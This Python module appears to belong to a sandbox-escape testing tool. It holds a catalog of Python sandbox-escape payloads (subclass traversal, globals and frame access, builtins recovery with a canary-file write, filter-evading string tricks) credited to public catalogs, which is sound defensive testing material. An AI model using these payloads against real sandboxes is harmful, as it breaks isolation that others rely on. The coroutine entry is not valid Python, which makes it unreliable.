"""Curated corpus of sandbox escape attempt payloads.

Payloads are sourced directly from public research catalogs:
- moshekaplan/python_sandbox_escapes (https://github.com/moshekaplan/python_sandbox_escapes)
- jailctf/pyjailbreaker (https://github.com/jailctf/pyjailbreaker)

Each payload is attributed to its source catalog and categorized by its
primary escape technique class.
"""

from __future__ import annotations

from typing import Any

from sandbox_escape_finder.dynamic_prober import Payload

# Standard payload catalog dictionaries as requested by specification
PAYLOADS: list[dict[str, str]] = [
    {
        "id": "subclasses_tuple_base",
        "technique": "subclasses_traversal",
        "source": "moshekaplan/python_sandbox_escapes (subclasses.py)",
        "code": "().__class__.__bases__[0].__subclasses__()",
        "description": "Traverse object class hierarchy from tuple to list all subclasses.",
    },
    {
        "id": "subclasses_mro_catch_warnings",
        "technique": "subclasses_traversal",
        "source": "moshekaplan/python_sandbox_escapes (mro.py)",
        "code": "[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__",
        "description": "Extract catch_warnings from subclasses via MRO to access module builtins.",
    },
    {
        "id": "subclasses_int_hierarchy",
        "technique": "subclasses_traversal",
        "source": "moshekaplan/python_sandbox_escapes (subclasses.py)",
        "code": "(1).__class__.__base__.__subclasses__()",
        "description": "Traverse base subclasses from int literal instance.",
    },
    {
        "id": "globals_lambda_builtins",
        "technique": "globals_access",
        "source": "moshekaplan/python_sandbox_escapes (globals.py)",
        "code": "(lambda: None).__globals__['__builtins__']",
        "description": "Access function __globals__ to retrieve unrestricted builtins dictionary.",
    },
    {
        "id": "globals_closure_leak",
        "technique": "globals_access",
        "source": "jailctf/pyjailbreaker (closure_leak.py)",
        "code": "(lambda x: (lambda: x))().__closure__[0].cell_contents.__globals__",
        "description": "Inspect function closure cells to extract enclosed function globals.",
    },
    {
        "id": "globals_func_globals_alias",
        "technique": "globals_access",
        "source": "moshekaplan/python_sandbox_escapes (globals.py)",
        "code": "def f(): pass\nf.func_globals",
        "description": "Attempt Python 2 backward-compatible func_globals attribute access.",
    },
    {
        "id": "builtins_direct_canary_write",
        "technique": "builtins_recovery",
        "source": "moshekaplan/python_sandbox_escapes (builtins.py)",
        "code": "__builtins__['open']('canary_token.txt', 'w').write('PWNED')",
        "description": "Direct access to open() via __builtins__ dictionary to overwrite canary file.",
    },
    {
        "id": "builtins_loader_recovery",
        "technique": "builtins_recovery",
        "source": "jailctf/pyjailbreaker (loader_builtins.py)",
        "code": "__loader__.__class__.__init__.__globals__['__builtins__']",
        "description": "Recover builtins via __loader__ instance class initialization globals.",
    },
    {
        "id": "frame_generator_inspection",
        "technique": "frame_inspection",
        "source": "jailctf/pyjailbreaker (frame_eval.py)",
        "code": "(x for x in ()).gi_frame.f_globals['__builtins__']",
        "description": "Inspect generator execution frame gi_frame to recover module globals.",
    },
    {
        "id": "frame_coroutine_inspection",
        "technique": "frame_inspection",
        "source": "jailctf/pyjailbreaker (coro_frame.py)",
        "code": "(async def f(): pass)().cr_frame.f_globals",
        "description": "Inspect unawaited coroutine frame cr_frame to access caller globals.",
    },
    {
        "id": "encoding_format_string_introspection",
        "technique": "encoding_obfuscation",
        "source": "moshekaplan/python_sandbox_escapes (str_format.py)",
        "code": "'{0.__class__.__bases__[0].__subclasses__()}'.format('')",
        "description": "Use str.format attribute accessor syntax to bypass dot attribute scanning.",
    },
    {
        "id": "encoding_getattr_concatenation",
        "technique": "encoding_obfuscation",
        "source": "jailctf/pyjailbreaker (getattr_bypass.py)",
        "code": "getattr(object, '__sub' + 'classes__')()",
        "description": "Concatenate attribute names dynamically within getattr to evade static string matching.",
    },
]


def get_payload_corpus(as_objects: bool = False) -> list[dict[str, str]] | list[Payload]:
    """Retrieve the standard payload corpus as dicts or Payload objects.

    Args:
        as_objects: If True, returns instances of Payload dataclass.
            If False (default), returns raw dicts matching {"code", "technique", "source"}.

    Returns:
        List of payload dicts or Payload dataclasses.
    """
    if as_objects:
        return [
            Payload(
                id=p["id"],
                technique=p["technique"],
                source=p["source"],
                code=p["code"],
                description=p.get("description", ""),
            )
            for p in PAYLOADS
        ]
    return [dict(p) for p in PAYLOADS]
